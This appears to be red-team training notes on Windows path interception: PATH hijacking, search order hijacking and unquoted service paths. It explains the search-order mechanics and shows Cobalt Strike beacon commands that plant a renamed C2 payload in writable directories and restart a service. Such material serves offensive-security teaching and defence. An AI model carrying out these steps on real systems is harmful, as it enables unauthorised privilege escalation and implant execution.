Path interception is a class of vulnerability that occurs when an adversary is able to drop an executable into a location where it will get executed before the intended one.  There are a few ways in which this can manifest, which are described below.

## PATH Environment Variable

The PATH environment variable contains a list of directories from which common programs are run.  For example, if you use `net` in a script or on the command line, `C:\Windows\System32\net.exe` is what gets executed.  Windows doesn't know where net.exe exists ahead of time, so it searches through each directory in the PATH to find it.

Each environment variable, including PATH, can be seen using the `env` command.

```powershell
beacon> env
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Bad Windows Service;C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
```

This variable is constructed from two locations:

- #### User
    
    These entries are read from the `HKEY_CURRENT_USER\Environment` registry key.  Each user on the computer can have a different path variable, which they are free to modify.
    
- #### Machine
    
    These entries are read from the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment` registry key.  Standard users cannot modify this.
    

The PATH variable for user processes is a concatenation of the Machine + User paths, whereas system processes just use the Machine paths.  Path interception by the PATH variable [T1574.007](https://attack.mitre.org/techniques/T1574/007/) occurs when additional directories get added to the machine's variable that are also writable by standard users.

Software installers commonly add their own paths _before_ the default ones.

```powershell
Path=C:\Python313\Scripts\;C:\Python313;C:\Windows\system32;C:\Windows; ... etc ...
```

This is particularly troublesome when the software is installed in the system root (i.e. C drive), because directories created here are writeable by standard users by default.  The permissions of a file or directory can be read using the `cacls` command.

```powershell
beacon> cacls C:\Python313\Scripts\

C:\Python313\Scripts\ BUILTIN\Administrators:(CI)(OI)F
                      NT AUTHORITY\SYSTEM:(CI)(OI)F
                      BUILTIN\Users:(CI)(OI)R
                      NT AUTHORITY\Authenticated Users:C
                      NT AUTHORITY\Authenticated Users:(CI)(OI)(IO)(special access:)
                                                                   DELETE
                                                                   GENERIC_READ
                                                                   GENERIC_WRITE
                                                                   GENERIC_EXECUTE
```

The key for this output is as follows:  

- **F**: Full
- **R**: Read & execute
- **C**: Read, write, execute, & delete
- **W**: Write
    

From this, we can see that Authenticated Users can write into `C:\Python313\Scripts`.

Now, consider the following C# code, which simply calls `cmd /c timeout`.
![[Pasted image 20250707100842.png]]
The timeout executable exists on disk at `C:\Windows\System32\timeout.exe`, which Windows must search the PATH environment variable to find.  This can therefore be exploited by dropping a binary called _timeout.exe_ into the `C:\Python313\Scripts` directory, because it will be searched before System32.

```powershell
beacon> cd C:\Python313\Scripts
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe timeout.exe
```

![[Pasted image 20250707100936.png]]

> Dropping a malicious binary as _cmd.exe_ in the same path will not work in this scenario (even though it's called with a relative path), which is explained in more detail below.

## Search Order Hijacking

As demonstrated above, when a program is run from a script or command line using a relative path, Windows must search the PATH environment variable to find it.  This can lead to hijacking opportunities if the PATH contains directories that proceed System32 and other core directories, that are also writable by standard users.

The note hints that cmd.exe cannot be executed in this case, which is because the underlying APIs used to run processes can follow different search orders (of which the PATH variable is just a small part).  Path interception by search order hijacking [[T1574.008](https://attack.mitre.org/techniques/T1574/008/)] occurs when an attacker can hijack this search order.

The behaviour of the calling application depends on which API and parameters are used to execute the target program.  The [WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec) API follows a similar search order to that of DLLs, which is:

- The executing directory.
    
- The current working directory.
    
- The System32 directory.
    
- The 16-bit System directory.
    
- The Windows directory.
    
- Directories in the PATH environment variable.
    

The [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) API can vary.  If `lpApplicationName` _is_ provided, then it will only search the current working directory.  By default, all services start with their current working directory set to `C:\Windows\System32`, which is why cmd.exe could not be hijacked using the PATH variable above.  If lpApplicationName is _not_ provided and `lpCommandLine` _is_, then it will follow the above search order.  The [Process](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process) class in .NET will call either [ShellExecuteEx](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexa) or CreateProcess depending on which parameters are passed to it.  ShellExecuteEx assumes the current working directory if a partial path is provided.

Hijacking cmd.exe would be possible if an adversary has write access to a directory that proceeds the legitimate one in the search order.  The only directory that proceeds the binary's current working directory and System32 is its executing directory, i.e. the directory the binary is located in, which in this example is `C:\Program Files\Bad Windows Service\Service Executable`.

In this case, we can see that the directory the service binary is running from is writable (in fact, Authenticated Users has full control over it).

```powershell
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable"
C:\Program Files\Bad Windows Service\Service Executable NT AUTHORITY\Authenticated Users:(CI)(OI)F

beacon> cd C:\Program Files\Bad Windows Service\Service Executable
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe cmd.exe
```

![[Pasted image 20250707101712.png]]
## Unquoted Paths

CreateProcess exhibits more interesting behaviour when the lpCommandLine parameter contains spaces _and not_ encapsulated by a set of quotations, as it does not follow the search order but instead tries to interpret the path based on whitespaces.  For example, `C:\Program Files\Bad Application\Bad Program.exe` would be interpreted as:

- C:\Program
    
- C:\Program.exe
    
- C:\Program Files\Bad
    
- C:\Program Files\Bad.exe
    
- C:\Program Files\Bad Application\Bad
    
- C:\Program Files\Bad Application\Bad.exe
    
- C:\Program Files\Bad Application\Bad Program.exe
    
- C:\Program Files\Bad Application\Bad Program.exe.exe

Path interception by unquoted path [T1574.009](https://attack.mitre.org/techniques/T1574/009/) can be exploited if an adversary can write a malicious program in one of these interpreted paths that occurs before the legitimate path.  A common scenario where this can be abused is when a service is configured to run a binary, but the path to that binary both has spaces and is unquoted.

This output of `sc_enum` shows that BadWindowsService is configured with an unquoted path.

```powershell
beacon> sc_enum

SERVICE_NAME: BadWindowsService
    [...snip...]
	BINARY_PATH_NAME               : C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe
```

This can be exploited if they can write to a location within the path where it will be interpreted differently, such as `C:\Program Files\Bad.exe` or `C:\Program Files\Bad Windows Service\Service.exe`, etc.

> [!NOTE] **IMPORTANT**
> When abusing services, the dedicated svc.exe payloads must be used.

```powershell
beacon> cacls "C:\Program Files\Bad Windows Service"
C:\Program Files\Bad Windows Service NT AUTHORITY\Authenticated Users:(CI)(OI)F

beacon> cd C:\Program Files\Bad Windows Service
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe Service.exe
```

A service runs its binary when it starts, so a service must be stopped and restarted to execute the malicious binary after it has been dropped to disk.  It may be the case that the adversary does not have permissions to do this, and therefore must wait until the computer restarts.  If they do have permissions, the `sc_stop` and `sc_start` commands can be used.

```powershell
beacon> sc_stop BadWindowsService
stop_service:
  hostname:    
  servicename: BadWindowsService
SUCCESS.

beacon> sc_start BadWindowsService
start_service:
  hostname:    
  servicename: BadWindowsService
SUCCESS.
```

![[Pasted image 20250707101704.png]]